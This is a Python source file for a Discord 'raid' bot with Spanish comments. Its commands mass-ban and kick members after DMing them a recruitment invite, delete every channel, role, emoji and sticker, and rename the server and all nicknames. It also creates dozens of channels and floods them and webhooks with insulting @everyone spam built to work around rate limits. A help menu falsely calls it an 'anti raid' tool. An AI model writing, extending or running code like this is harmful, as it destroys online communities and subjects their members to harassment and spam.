import discord
from discord.ext import commands
import asyncio
import logging
import os
import random
from datetime import datetime
import aiohttp
import io

# Configuración de logging optimizada para monitoreo
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

PREFIX = "!"
TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"

# El banner animado por defecto de Discord
GIF_DEFECTO = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"
ID_ROL_PREMIUM = 1513841062651756615

# ================= VARIABLES GLOBALES INDEPENDIENTES =================
ejecuciones_por_servidor = {}  
MAX_EJECUCIONES = 2
tiempo_inicio = datetime.now()

# Estructuras en memoria para el sistema Premium
configuracion_premium = {}  # Guarda canal, mensaje y url_imagen por Guild
usuarios_autorizados = set() # Guarda las IDs de usuarios que pueden reclamar .premium

# Configuración explícita de los Intents necesarios
intents = discord.Intents.default()
intents.members = True  
intents.messages = True  
intents.message_content = True  

bot = commands.Bot(command_prefix=["!", "."], intents=intents)

@bot.event
async def on_ready():
    global tiempo_inicio
    tiempo_inicio = datetime.now()
    logging.info(f"⚡ MacHUB Engine Conectado: {bot.user.name} (ID: {bot.user.id})")


# === FUNCIÓN AUXILIAR ADAPTATIVA PARA ENVIAR GIFS O FOTOS COMO ARCHIVO REAL ===
async def obtener_imagen_file(url_objetivo):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url_objetivo) as resp:
                if resp.status == 200:
                    data = io.BytesIO(await resp.read())
                    ext = "gif" if "gif" in url_objetivo.lower() else "webp" if "webp" in url_objetivo.lower() else "png"
                    return discord.File(data, filename=f"machub_media.{ext}")
    except Exception as e:
        logging.error(f"Error al descargar multimedia ({url_objetivo}): {e}")
    return None


# ================= FUNCIÓN AUXILIAR PARA EL EMBED DE !eje =================
def generar_embed_eje(guild_id):
    global ejecuciones_por_servidor, MAX_EJECUCIONES
    actuales = ejecuciones_por_servidor.get(guild_id, 0)
    
    if actuales == 0: color = discord.Color.green()
    elif actuales == 1: color = discord.Color.orange()
    else: color = discord.Color.red()
    
    embed = discord.Embed(
        title="📊 CONTROL DE EJECUCIONES",
        description=f"Ejecuciones del bot en este servidor: `{actuales}/{MAX_EJECUCIONES}`",
        color=color
    )
    embed.set_footer(text="MacHUB Engine • Monitoreo en vivo")
    embed.timestamp = datetime.now()
    return embed


# ================= COMANDO !eje =================
@bot.command()
async def eje(ctx):
    if not ctx.guild: return  
    embed = generar_embed_eje(ctx.guild.id)
    try: await ctx.send(embed=embed)
    except: pass


# ================= COMANDO INTERACTIVO !editar raid PASO A PASO =================
@bot.command(name="editar")
async def editar(ctx, subcom_raid: str = None):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.administrator: return

    if not subcom_raid or subcom_raid.lower() != "raid":
        await ctx.send("❌ Uso correcto: `!editar raid` (El bot te irá preguntando los datos paso a paso).")
        return

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        await ctx.send("❓ **Paso 1/3:** ¿Qué nombre deseas ponerle a los canales creados?")
        msg_canal = await bot.wait_for('message', check=check, timeout=60.0)
        nombre_canal = msg_canal.content.strip().replace(" ", "-")

        await ctx.send("❓ **Paso 2/3:** ¿Qué mensaje de spam deseas que envíe el bot de forma masiva?")
        msg_spam = await bot.wait_for('message', check=check, timeout=60.0)
        mensaje_spam = msg_spam.content.strip()

        await ctx.send("❓ **Paso 3/3:** Envía el enlace (URL directa) de la foto o el GIF que usará el ataque:")
        msg_media = await bot.wait_for('message', check=check, timeout=60.0)
        url_media = msg_media.content.strip()

    except asyncio.TimeoutError:
        await ctx.send("⏱️ **Tiempo agotado.** Tardaste demasiado en responder, el proceso de edición se ha cancelado.")
        return

    configuracion_premium[ctx.guild.id] = {
        "canal": nombre_canal,
        "media": url_media,
        "mensaje": mensaje_spam
    }

    embed_exito = discord.Embed(
        title="💎 CONFIGURACIÓN GUARDADA CON ÉXITO",
        description="¡El asistente interactivo ha finalizado! Los parámetros ya se guardaron y puedes revisarlos usando `!config`.",
        color=discord.Color.purple()
    )
    embed_exito.add_field(name="📁 Nombre de Canales:", value=f"`#{nombre_canal}`", inline=True)
    embed_exito.add_field(name="💬 Mensaje de Spam:", value=mensaje_spam, inline=False)
    embed_exito.set_image(url=url_media)
    embed_exito.set_footer(text="MacHUB Engine Premium v2")
    
    await ctx.send(embed=embed_exito)


# ================= COMANDO PREMIUM !config =================
@bot.command()
async def config(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_guild: return

    datos = configuracion_premium.get(
        ctx.guild.id, 
        {
            "canal": "Mc R", 
            "media": GIF_DEFECTO, 
            "mensaje": "@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp"
        }
    )

    embed_config = discord.Embed(
        title=f"⚙️ AJUSTES DE RAID - {ctx.guild.name.upper()}",
        color=discord.Color.gold()
    )
    embed_config.add_field(name="📁 Formato de Canales", value=f"`{datos['canal']}`", inline=True)
    embed_config.add_field(name="💬 Contenido de Inundación", value=f"{datos['mensaje']}", inline=False)
    embed_config.add_field(name="🖼️ Enlace Multimedia Actual", value=f"[Ver Archivo Adjunto]({datos['media']})", inline=False)
    embed_config.set_image(url=datos['media'])
    embed_config.set_footer(text="Ajustes cargados dinámicamente desde !editar raid")
    
    await ctx.send(embed=embed_config)
    # ================= COMANDO !dar premium =================
@bot.command(name="dar")
async def dar_premium(ctx, subcom_prem: str = None, miembro: discord.Member = None):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.administrator: return

    if not subcom_prem or subcom_prem.lower() != "premium" or not miembro:
        await ctx.send("❌ Usa el comando así: `!dar premium @Persona`")
        return

    usuarios_autorizados.add(miembro.id)
    await ctx.send(f"✅ ¡{miembro.mention} ha sido autorizado! Ahora debe escribir `.premium` para reclamar su rol.")


# ================= COMANDO RECLAMAR .premium =================
@bot.command(name="premium")
async def reclamar_premium(ctx):
    if not ctx.guild: return
    
    if not ctx.message.content.startswith(".premium"): 
        return

    if ctx.author.id not in usuarios_autorizados:
        await ctx.send(f"❌ {ctx.author.mention}, no tienes ninguna asignación Premium pendiente. Pídele a un admin que use `!dar premium` contigo.")
        return

    rol = ctx.guild.get_role(ID_ROL_PREMIUM)
    if not rol:
        await ctx.send("❌ Error: El rol Premium con la ID configurada no existe en este servidor.")
        return

    try:
        await ctx.author.add_roles(rol, reason="Reclamación automática de suscripción Premium.")
        usuarios_autorizados.remove(ctx.author.id)
        await ctx.send(f"👑 ¡Felicidades {ctx.author.mention}! Se te ha otorgado correctamente el rol **{rol.name}**.")
    except discord.Forbidden:
        await ctx.send("❌ No tengo permisos suficientes para otorgar ese rol. Verifica mi posición en la lista de roles.")
    except Exception as e:
        logging.error(f"Error al dar rol: {e}")


# ================= 1. COMANDO BANPRO =================
@bot.command()
async def banpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.ban_members: return
    if not ctx.guild.me.guild_permissions.ban_members: return
    
    mensaje_dm = "Mi bot te baneo de tu servidor 😂 quieres hacerlo? Unete aqui https://discord.gg/aACMXB4HSp"
    
    datos_raid = configuracion_premium.get(ctx.guild.id, {"media": GIF_DEFECTO})
    gif_file = await obtener_imagen_file(datos_raid["media"])
    
    targets = [
        member for member in ctx.guild.members 
        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
    ]
    
    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def process_member(member):
            try: 
                if gif_file:
                    gif_file.fp.seek(0)
                    await member.send(content=mensaje_dm, file=gif_file)
                else:
                    await member.send(content=mensaje_dm)
            except: pass
            try: await member.ban(reason="Baneo masivo By Mac.")
            except: pass

        tasks = [process_member(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)


# ================= 2. COMANDO RAIDEAR Y SPAM (rD) SIN COOLDOWN =================
@bot.command()
async def rD(ctx):
    global ejecuciones_por_servidor
    if not ctx.guild: return
    
    if not ctx.author.guild_permissions.manage_channels: return
    if not ctx.guild.me.guild_permissions.manage_channels: return

    actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)

    if actuales >= MAX_EJECUCIONES:
        try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). Espera a que termine el ataque actual.")
        except: pass
        return

    sumado = False

    config_actual = configuracion_premium.get(
        ctx.guild.id, 
        {
            "canal": "Mc R", 
            "media": GIF_DEFECTO,
            "mensaje": "@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp"
        }
    )

    try:
        ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
        sumado = True
        logging.info(f"📈 [INICIO] Contador para Guild {ctx.guild.id}: {actuales + 1}/{MAX_EJECUCIONES}")

        channels_to_delete = list(ctx.guild.channels)
        for channel in channels_to_delete:
            try: await channel.delete()
            except: pass

        created_channels = []
        for _ in range(50):
            try:
                ch = await ctx.guild.create_text_channel(name=config_actual["canal"])
                created_channels.append(ch)
            except: pass

        msg_por_canal = 400 
        gif_file = await obtener_imagen_file(config_actual["media"])
        
        async def spam_task(channel):
            for _ in range(msg_por_canal):
                try:
                    if gif_file:
                        gif_file.fp.seek(0)
                        await channel.send(content=config_actual["mensaje"], file=gif_file)
                    else:
                        await channel.send(content=config_actual["mensaje"])
                    await asyncio.sleep(0.1) 
                except discord.HTTPException as e:
                    if e.status == 429: await asyncio.sleep(5)
                    else: break

        tasks = [spam_task(ch) for ch in created_channels]
        await asyncio.gather(*tasks)

    finally:
        if sumado:
            actuales_al_final = ejecuciones_por_servidor.get(ctx.guild.id, 1)
            ejecuciones_por_servidor[ctx.guild.id] = max(0, actuales_al_final - 1)
            logging.info(f"📉 [FIN] Contador para Guild {ctx.guild.id} restablecido a: {ejecuciones_por_servidor[ctx.guild.id]}/{MAX_EJECUCIONES}")


# ================= 3. EXPULSIÓN MASIVA =================
@bot.command()
async def kickpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.kick_members: return
    if not ctx.guild.me.guild_permissions.kick_members: return

    try: 
        datos_raid = configuracion_premium.get(ctx.guild.id, {"media": GIF_DEFECTO})
        gif_file = await obtener_imagen_file(datos_raid["media"])
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    targets = [
        member for member in ctx.guild.members 
        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
    ]

    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def process_kick(member):
            try: await member.kick(reason="Limpieza Masiva By Mac.")
            except: pass

        tasks = [process_kick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)


# ================= 4. CAMBIAR IDENTIDAD DEL SERVIDOR =================
@bot.command()
async def rnServers(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_guild: return
    if not ctx.guild.me.guild_permissions.manage_guild: return

    try:
        await ctx.guild.edit(name="Mc R", description="Server dominado.")
        datos_raid = configuracion_premium.get(ctx.guild.id, {"media": GIF_DEFECTO})
        gif_file = await obtener_imagen_file(datos_raid["media"])
        if gif_file: await ctx.send(file=gif_file)
    except:
        pass


# ================= 5. BORRAR TODOS LOS ROLES =================
@bot.command()
async def rolesD(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    try: 
        datos_raid = configuracion_premium.get(ctx.guild.id, {"media": GIF_DEFECTO})
        gif_file = await obtener_imagen_file(datos_raid["media"])
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    roles_to_delete = [
        role for role in ctx.guild.roles 
        if role.name != "@everyone" and role < ctx.guild.me.top_role and not role.is_bot_managed()
    ]

    for role in roles_to_delete:
        try: await role.delete(reason="Remoción de roles.")
        except: pass
        await asyncio.sleep(0.2)


# ================= 6. CREACIÓN MASIVA DE ROLES =================
@bot.command()
async def rolesC(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    try: 
        datos_raid = configuracion_premium.get(ctx.guild.id, {"media": GIF_DEFECTO})
        gif_file = await obtener_imagen_file(datos_raid["media"])
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    async def create_role_task():
        try:
            color_aleatorio = discord.Color(random.randint(0, 0xFFFFFF))
            await ctx.guild.create_role(name="Mc R", color=color_aleatorio)
        except:
            pass

    for i in range(0, 50, 10):
        tasks = [create_role_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)


# ================= 7. SATURACIÓN DE CATEGORÍAS =================
@bot.command()
async def ccpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_channels: return
    if not ctx.guild.me.guild_permissions.manage_channels: return

    for channel in list(ctx.guild.channels):
        try: await channel.delete()
        except: pass

    async def create_category_task():
        try: await ctx.guild.create_category(name="Mc R")
        except: pass

    for i in range(0, 50, 10):
        tasks = [create_category_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.4)


# ================= 8. CAMBIAR APODOS GLOBALMENTE =================
@bot.command()
async def nickpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_nicknames: return
    if not ctx.guild.me.guild_permissions.manage_nicknames: return

    try: 
        datos_raid = configuracion_premium.get(ctx.guild.id, {"media": GIF_DEFECTO})
        gif_file = await obtener_imagen_file(datos_raid["media"])
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    targets = [
        m for m in ctx.guild.members 
        if m.id != ctx.guild.owner_id and m.top_role < ctx.guild.me.top_role
    ]

    chunk_size = 20
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def set_nick(member):
            try: await member.edit(nick="Mc R")
            except: pass

        tasks = [set_nick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)


# ================= 9. BORRAR EMOJIS Y STICKERS =================
@bot.command()
async def emojisD(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_expressions: return
    if not ctx.guild.me.guild_permissions.manage_expressions: return

    try: 
        datos_raid = configuracion_premium.get(ctx.guild.id, {"media": GIF_DEFECTO})
        gif_file = await obtener_imagen_file(datos_raid["media"])
        if gif_file: await ctx.send(file=gif_file)
    except: pass

    for emoji in list(ctx.guild.emojis):
        try: await emoji.delete()
        except: pass
    
    for sticker in list(ctx.guild.stickers):
        try: await sticker.delete()
        except: pass


# ================= 10. MULTI-WEBHOOK ATTACK =================
@bot.command()
async def hookpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_webhooks: return
    if not ctx.guild.me.guild_permissions.manage_webhooks: return

    channels = ctx.guild.text_channels
    if not channels: return

    mensaje_webhook = "@everyone server Nuevo https://discord.gg/aACMXB4HSp"
    datos_raid = configuracion_premium.get(ctx.guild.id, {"media": GIF_DEFECTO})
    gif_file = await obtener_imagen_file(datos_raid["media"])

    async def launch_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="Mc R Engine")
            for _ in range(25):
                if gif_file:
                    gif_file.fp.seek(0)
                    await webhook.send(content=mensaje_webhook, file=gif_file, username="Mc R")
                else:
                    await webhook.send(content=mensaje_webhook, username="Mc R")
                await asyncio.sleep(0.2)
        except:
            pass

    tasks = [launch_webhook(ch) for ch in channels[:15]]
    await asyncio.gather(*tasks)


# ================= 11. COMANDO UPTIME =================
@bot.command()
async def uptime(ctx):
    try:
        delta_tiempo = datetime.now() - tiempo_inicio
        dias = delta_tiempo.days
        horas, rem = divmod(delta_tiempo.seconds, 3600)
        minutos, segundos = divmod(rem, 60)
        ping_ms = round(bot.latency * 1000)
        
        await ctx.send(
            f"📊 **Estado del Motor:**\n"
            f"⏱️ **Tiempo activo:** `{dias}d {horas}h {minutos}m {segundos}s`\n"
            f"⚡ **Latencia (Ping):** `{ping_ms}ms`"
        )
    except:
        pass


# ================= 12. MENÚ DE AYUDA COMPLETO =================
@bot.command()
async def ayuda(ctx):
    menu = (
        "```\n"
        "=== Mc R Anti raid - cmds ===\n"
        "!uptime       -> Muestra el tiempo activo del bot y la latencia.\n"
        "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
        "!config       -> Muestra el diseño personalizado configurado.\n"
        "!editar raid  -> Lanza el asistente interactivo para configurar la raid.\n"
        "!dar premium  -> Otorga permiso a un usuario para reclamar el rango.\n"
        ".premium      -> Canjea tu rol premium automáticamente si fuiste asignado.\n"
        "!banpro       -> DM Masivo + Ban global utilizando la multimedia asignada.\n"
        "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
        "!rD           -> elimina todo, crea canales e inunda con la config actual.\n"
        "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
        "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
        "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
        "!rnServers    -> Cambia el nombre del servidor a 'Mc R'.\n"
        "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
        "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
        "!emojisD      -> elimina los emojis y stickers personalizados.\n"
        "```"
    )
    try: await ctx.send(menu)
    except: pass


# ================= MANEJO DE ERRORES LIGERO =================
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): return
    logging.error(f"Error: {error}")

bot.run(TOKEN)
    
